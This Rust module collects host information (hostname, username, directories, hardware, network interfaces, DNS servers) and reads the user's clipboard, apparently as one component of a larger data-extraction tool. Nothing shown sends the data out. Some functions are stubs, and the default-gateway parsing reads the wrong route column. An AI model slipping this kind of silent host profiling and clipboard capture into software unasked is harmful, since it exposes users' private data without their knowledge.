use std::collections::BTreeMap;
use std::env;
use std::fs;

use super::errors::ExtractionError;
use super::types::{DataType, ExtractedData, ExtractionResult, ExtractionTarget};

/// Extracts system information
pub struct SystemExtractor;

impl Default for SystemExtractor {
    fn default() -> Self {
        Self::new()
    }
}

impl SystemExtractor {
    pub fn new() -> Self {
        Self
    }
    
    /// Extract all system information
    pub fn extract_all(&self) -> Vec<ExtractionResult> {
        let mut results = Vec::new();
        
        results.push(self.extract_system_info());
        results.push(self.extract_hardware_info());
        results.push(self.extract_network_info());
        results.push(self.extract_clipboard());
        
        results
    }
    
    /// Extract general system information
    pub fn extract_system_info(&self) -> ExtractionResult {
        let mut info = BTreeMap::new();
        
        // OS information
        info.insert("os".to_string(), std::env::consts::OS.to_string());
        info.insert("arch".to_string(), std::env::consts::ARCH.to_string());
        info.insert("family".to_string(), std::env::consts::FAMILY.to_string());
        
        // Hostname
        if let Ok(hostname) = hostname::get() {
            info.insert("hostname".to_string(), hostname.to_string_lossy().to_string());
        }
        
        // Username
        if let Ok(username) = env::var("USER").or_else(|_| env::var("USERNAME")) {
            info.insert("username".to_string(), username);
        }
        
        // Home directory
        if let Ok(home) = env::var("HOME").or_else(|_| env::var("USERPROFILE")) {
            info.insert("home_dir".to_string(), home);
        }
        
        // Current directory
        if let Ok(cwd) = env::current_dir() {
            info.insert("cwd".to_string(), cwd.display().to_string());
        }
        
        // Environment variables (filtered)
        let filtered_env: BTreeMap<String, String> = env::vars()
            .filter(|(k, _)| {
                !k.to_lowercase().contains("pass") &&
                !k.to_lowercase().contains("secret") &&
                !k.to_lowercase().contains("key") &&
                !k.to_lowercase().contains("token")
            })
            .collect();
        
        info.insert("env_count".to_string(), filtered_env.len().to_string());
        
        // Convert to JSON
        let json_content = serde_json::to_string_pretty(&info).unwrap_or_default();
        
        let mut metadata = BTreeMap::new();
        metadata.insert("type".to_string(), "system_info".to_string());
        metadata.insert("extracted_at".to_string(), get_timestamp());
        
        let data = vec![ExtractedData {
            target: ExtractionTarget::SystemInfo,
            name: "system_info.json".to_string(),
            data_type: DataType::Json,
            content: json_content.into_bytes(),
            metadata,
        }];
        
        ExtractionResult::success(ExtractionTarget::SystemInfo, data)
    }
    
    /// Extract hardware information
    pub fn extract_hardware_info(&self) -> ExtractionResult {
        let mut hardware = BTreeMap::new();
        
        // CPU information
        hardware.insert("cpu_arch".to_string(), std::env::consts::ARCH.to_string());
        hardware.insert("cpu_count".to_string(), num_cpus::get().to_string());
        
        // Memory information
        if let Some(total_mem) = get_total_memory() {
            hardware.insert("total_memory_bytes".to_string(), total_mem.to_string());
        }
        
        // Disk information
        if let Ok(disk_info) = get_disk_info() {
            hardware.insert("disk_total_bytes".to_string(), disk_info.total.to_string());
            hardware.insert("disk_free_bytes".to_string(), disk_info.free.to_string());
        }
        
        // Platform-specific hardware info
        #[cfg(target_os = "linux")]
        {
            if let Ok(cpuinfo) = fs::read_to_string("/proc/cpuinfo") {
                if let Some(model) = extract_cpu_model(&cpuinfo) {
                    hardware.insert("cpu_model".to_string(), model);
                }
            }
            
            if let Ok(meminfo) = fs::read_to_string("/proc/meminfo") {
                if let Some(mem_total) = extract_mem_total(&meminfo) {
                    hardware.insert("mem_total_kb".to_string(), mem_total);
                }
            }
        }
        
        #[cfg(target_os = "windows")]
        {
            // Windows-specific hardware enumeration would go here
            // Could use wmi or winapi crates for detailed info
        }
        
        #[cfg(target_os = "macos")]
        {
            // macOS-specific hardware enumeration would go here
            // Could use sysctl commands
        }
        
        // Convert to JSON
        let json_content = serde_json::to_string_pretty(&hardware).unwrap_or_default();
        
        let mut metadata = BTreeMap::new();
        metadata.insert("type".to_string(), "hardware_info".to_string());
        metadata.insert("extracted_at".to_string(), get_timestamp());
        
        let data = vec![ExtractedData {
            target: ExtractionTarget::HardwareInfo,
            name: "hardware_info.json".to_string(),
            data_type: DataType::Json,
            content: json_content.into_bytes(),
            metadata,
        }];
        
        ExtractionResult::success(ExtractionTarget::HardwareInfo, data)
    }
    
    /// Extract network information
    pub fn extract_network_info(&self) -> ExtractionResult {
        let mut network = BTreeMap::new();
        
        // Get network interfaces
        let interfaces = get_network_interfaces();
        network.insert("interface_count".to_string(), interfaces.len().to_string());
        
        // Serialize interfaces
        let interfaces_json = serde_json::to_value(&interfaces).unwrap_or_default();
        network.insert("interfaces".to_string(), interfaces_json.to_string());
        
        // Get default gateway (platform-specific)
        if let Some(gateway) = get_default_gateway() {
            network.insert("default_gateway".to_string(), gateway);
        }
        
        // Get DNS servers (platform-specific)
        let dns_servers = get_dns_servers();
        if !dns_servers.is_empty() {
            network.insert("dns_servers".to_string(), dns_servers.join(", "));
        }
        
        // Get external IP (via API call - optional)
        // This would require HTTP client, so we skip for now
        
        // Convert to JSON
        let json_content = serde_json::to_string_pretty(&network).unwrap_or_default();
        
        let mut metadata = BTreeMap::new();
        metadata.insert("type".to_string(), "network_info".to_string());
        metadata.insert("extracted_at".to_string(), get_timestamp());
        
        let data = vec![ExtractedData {
            target: ExtractionTarget::NetworkInfo,
            name: "network_info.json".to_string(),
            data_type: DataType::Json,
            content: json_content.into_bytes(),
            metadata,
        }];
        
        ExtractionResult::success(ExtractionTarget::NetworkInfo, data)
    }
    
    /// Extract clipboard content
    pub fn extract_clipboard(&self) -> ExtractionResult {
        let mut metadata = BTreeMap::new();
        metadata.insert("type".to_string(), "clipboard".to_string());
        metadata.insert("extracted_at".to_string(), get_timestamp());
        
        // Try to get clipboard content
        // This is platform-specific and may not work in all environments
        
        #[cfg(target_os = "linux")]
        let content = get_clipboard_linux();
        
        #[cfg(target_os = "windows")]
        let content = get_clipboard_windows();
        
        #[cfg(target_os = "macos")]
        let content = get_clipboard_macos();
        
        #[cfg(not(any(target_os = "linux", target_os = "windows", target_os = "macos")))]
        let content: Option<String> = None;
        
        match content {
            Some(text) => {
                metadata.insert("length".to_string(), text.len().to_string());
                
                let data = vec![ExtractedData {
                    target: ExtractionTarget::Clipboard,
                    name: format!("clipboard_{}.txt", get_timestamp()),
                    data_type: DataType::Text,
                    content: text.into_bytes(),
                    metadata,
                }];
                
                ExtractionResult::success(ExtractionTarget::Clipboard, data)
            }
            None => {
                ExtractionResult::failure(
                    ExtractionTarget::Clipboard,
                    "Could not access clipboard".to_string(),
                )
            }
        }
    }
}

// Helper functions

fn get_timestamp() -> String {
    use std::time::{SystemTime, UNIX_EPOCH};
    SystemTime::now()
        .duration_since(UNIX_EPOCH)
        .map(|d| d.as_secs().to_string())
        .unwrap_or_else(|_| "0".to_string())
}

fn get_total_memory() -> Option<u64> {
    #[cfg(target_os = "linux")]
    {
        if let Ok(meminfo) = fs::read_to_string("/proc/meminfo") {
            for line in meminfo.lines() {
                if line.starts_with("MemTotal:") {
                    let parts: Vec<&str> = line.split_whitespace().collect();
                    if parts.len() >= 2 {
                        if let Ok(kb) = parts[1].parse::<u64>() {
                            return Some(kb * 1024);
                        }
                    }
                }
            }
        }
    }
    
    #[cfg(any(target_os = "windows", target_os = "macos"))]
    {
        // Would use sysinfo or similar crate
        None
    }
    
    None
}

struct DiskInfo {
    total: u64,
    free: u64,
}

fn get_disk_info() -> Result<DiskInfo, ExtractionError> {
    // Simplified implementation - would use sysinfo crate for full info
    Ok(DiskInfo { total: 0, free: 0 })
}

#[cfg(target_os = "linux")]
fn extract_cpu_model(cpuinfo: &str) -> Option<String> {
    for line in cpuinfo.lines() {
        if line.starts_with("model name") {
            let parts: Vec<&str> = line.splitn(2, ':').collect();
            if parts.len() == 2 {
                return Some(parts[1].trim().to_string());
            }
        }
    }
    None
}

#[cfg(target_os = "linux")]
fn extract_mem_total(meminfo: &str) -> Option<String> {
    for line in meminfo.lines() {
        if line.starts_with("MemTotal:") {
            let parts: Vec<&str> = line.split_whitespace().collect();
            if parts.len() >= 2 {
                return Some(parts[1].to_string());
            }
        }
    }
    None
}

fn get_network_interfaces() -> Vec<BTreeMap<String, String>> {
    let mut interfaces = Vec::new();
    
    // Simple implementation - would use pnet or if_addrs crate for full info
    if let Ok(leases) = fs::read_to_string("/var/lib/dhcp/dhclient.leases") {
        for line in leases.lines() {
            if line.trim().starts_with("interface") {
                let mut iface = BTreeMap::new();
                iface.insert("name".to_string(), line.trim().to_string());
                interfaces.push(iface);
            }
        }
    }
    
    // Fallback: list /sys/class/net
    if interfaces.is_empty() {
        if let Ok(entries) = fs::read_dir("/sys/class/net") {
            for entry in entries.flatten() {
                let mut iface = BTreeMap::new();
                iface.insert("name".to_string(), entry.file_name().to_string_lossy().to_string());
                interfaces.push(iface);
            }
        }
    }
    
    interfaces
}

fn get_default_gateway() -> Option<String> {
    #[cfg(target_os = "linux")]
    {
        if let Ok(route) = fs::read_to_string("/proc/net/route") {
            for line in route.lines().skip(1) {
                let parts: Vec<&str> = line.split_whitespace().collect();
                if parts.len() >= 2 && parts[1] == "00000000" {
                    return Some("0.0.0.0".to_string());
                } else if parts.len() >= 2 {
                    // Parse hex IP
                    if let Some(ip) = parse_hex_ip(parts[1]) {
                        return Some(ip);
                    }
                }
            }
        }
    }
    
    None
}

fn get_dns_servers() -> Vec<String> {
    #[cfg(target_os = "linux")]
    {
        if let Ok(resolv_conf) = fs::read_to_string("/etc/resolv.conf") {
            let mut servers = Vec::new();
            for line in resolv_conf.lines() {
                if line.trim().starts_with("nameserver") {
                    let parts: Vec<&str> = line.split_whitespace().collect();
                    if parts.len() >= 2 {
                        servers.push(parts[1].to_string());
                    }
                }
            }
            return servers;
        }
    }
    
    Vec::new()
}

#[cfg(target_os = "linux")]
fn parse_hex_ip(hex: &str) -> Option<String> {
    if hex.len() != 8 {
        return None;
    }
    
    let bytes = [
        u8::from_str_radix(&hex[6..8], 16).ok()?,
        u8::from_str_radix(&hex[4..6], 16).ok()?,
        u8::from_str_radix(&hex[2..4], 16).ok()?,
        u8::from_str_radix(&hex[0..2], 16).ok()?,
    ];
    
    Some(format!("{}.{}.{}.{}", bytes[0], bytes[1], bytes[2], bytes[3]))
}

#[cfg(target_os = "linux")]
fn get_clipboard_linux() -> Option<String> {
    // Try xclip or xsel
    std::process::Command::new("xclip")
        .args(["-selection", "clipboard", "-o"])
        .output()
        .ok()
        .and_then(|out| String::from_utf8(out.stdout).ok())
        .or_else(|| {
            std::process::Command::new("xsel")
                .args(["--clipboard", "--output"])
                .output()
                .ok()
                .and_then(|out| String::from_utf8(out.stdout).ok())
        })
}

#[cfg(target_os = "windows")]
fn get_clipboard_windows() -> Option<String> {
    // Would use clipboard-win or winapi crate
    None
}

#[cfg(target_os = "macos")]
fn get_clipboard_macos() -> Option<String> {
    std::process::Command::new("pbpaste")
        .output()
        .ok()
        .and_then(|out| String::from_utf8(out.stdout).ok())
}
